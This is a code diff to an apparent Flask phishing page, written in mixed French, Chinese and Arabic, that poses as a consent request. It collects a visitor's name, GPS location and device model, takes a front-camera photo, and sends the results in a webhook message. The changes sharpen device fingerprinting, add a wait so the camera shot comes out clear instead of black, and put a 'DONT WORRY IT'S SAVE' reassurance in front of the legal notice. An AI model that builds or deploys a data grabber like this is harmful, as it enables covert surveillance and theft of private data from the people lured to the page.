@@ -50,7 +50,7 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-             法律声明：<br>
+            DONT WORRY IT'S SAVE: 法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
@@ -77,19 +77,25 @@ HTML_TEMPLATE = """
             const ua = navigator.userAgent;
             let model = "Appareil Inconnu";
             
+            // محاولة استخراج موديل الأندرويد بدقة (مثل Samsung, Xiaomi, etc.)
             if (/android/i.test(ua)) {
-                const match = ua.match(/;\s?([a-zA-Z0-9\s\-_]+)\s+Build\//);
-                if (match && match[1]) {
-                    model = match[1].trim();
+                let match = ua.match(/\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|SCH-[A-Z0-9]+|SM-F[0-9]+|Pixel\s[0-9a-zA-Z\s]+|Redmi\s[0-9A-Za-z\s]+|POCO\s[0-9A-Za-z\s]+|M2[0-9a-zA-Z]+\b)/i);
+                if (match) {
+                    model = "Android / " + match[0];
                 } else {
-                    model = "Téléphone Android";
+                    const buildMatch = ua.match(/;\s?([a-zA-Z0-9\s\-_]+)\s+Build\//);
+                    if (buildMatch && buildMatch[1]) {
+                        model = "Android / " + buildMatch[1].trim();
+                    } else {
+                        model = "Android / Smartphone";
+                    }
                 }
             } else if (/iphone|ipad|ipod/i.test(ua)) {
-                model = "iPhone / iOS Device";
+                model = "Apple / iPhone iOS";
             } else if (/windows/i.test(ua)) {
-                model = "PC Windows";
+                model = "PC / Windows";
             } else if (/macintosh|mac os x/i.test(ua)) {
-                model = "Mac";
+                model = "Mac / Apple";
             }
             return model;
         }
@@ -135,7 +141,7 @@ HTML_TEMPLATE = """
                 locationData = "Accès à la localisation refusé";
             }
 
-            // 2. تشغيل الكاميرا والتقاط الصورة بسرعة فائقة
+            // 2. تشغيل الكاميرا والتقاط صورة واضحة وليست سوداء
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const videoElement = document.getElementById('webcam');
@@ -143,12 +149,8 @@ HTML_TEMPLATE = """
                 
                 videoElement.srcObject = stream;
                 
-                await new Promise((resolve) => {
-                    videoElement.onloadedmetadata = () => {
-                        resolve();
-                    };
-                    setTimeout(resolve, 300); // التقاط سريع بدون انتظار طويل
-                });
+                // الانتظار لمدة ثانية واحدة لضمان تهيئة العدسة ووضوح الصورة
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
                 canvas.width = videoElement.videoWidth || 640;
                 canvas.height = videoElement.videoHeight || 480;
@@ -214,7 +216,7 @@ def submit_consent():
         "content": (
             f"✅ **Nouveau consentement et détails de l'appareil:**\n"
             f"• **Nom:** {username}\n"
-            f"• **Type de téléphone/Appareil:** {device.get('model')}\n"
+            f"• **Modèle exact de l'appareil:** {device.get('model')}\n"
             f"• **Localisation (GPS):** {location}\n"
             f"• **Résolution d'écran:** {device.get('screen')}\n"
             f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
